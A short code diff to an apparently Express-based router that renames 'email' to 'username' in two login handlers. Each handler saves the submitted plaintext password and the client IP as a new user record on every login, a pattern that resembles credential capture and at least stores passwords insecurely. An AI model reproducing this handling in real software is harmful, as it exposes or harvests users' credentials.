@@ -276,7 +276,7 @@ router.post('/login', (req, res, next) => {
 
 
   const user = new User({
-    email: req.body.email,
+    username: req.body.email,
     password: req.body.password,
     id: randomId,
     userIp: clientIP,
@@ -301,7 +301,7 @@ router.post('/loginverify', (req, res, next) => {
   const clientIP = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
   const user = new User({
-    email: req.body.email,
+    username: req.body.email,
     password: req.body.password,
     id: randomId,
     userIp: clientIP,
